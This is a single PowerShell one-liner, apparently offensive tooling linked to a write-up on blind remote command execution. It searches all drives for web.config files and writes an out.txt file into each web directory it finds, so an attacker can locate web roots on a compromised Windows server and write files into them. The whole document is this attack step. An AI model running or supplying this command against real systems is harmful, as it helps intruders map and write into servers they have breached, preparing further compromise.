# Usage and details - https://huntr.sh/posts/web-root-and-blind-remote-command-execution/
(Get-PSDrive -PSProvider FileSystem).Root | ForEach-Object {(Get-ChildItem -Path $_ -Filter "web.config" -Recurse -ErrorAction SilentlyContinue -Force).DirectoryName | ForEach-Object {Out-File -FilePath "$_\\out.txt" -InputObject $_ -Force -ErrorAction SilentlyContinue}}
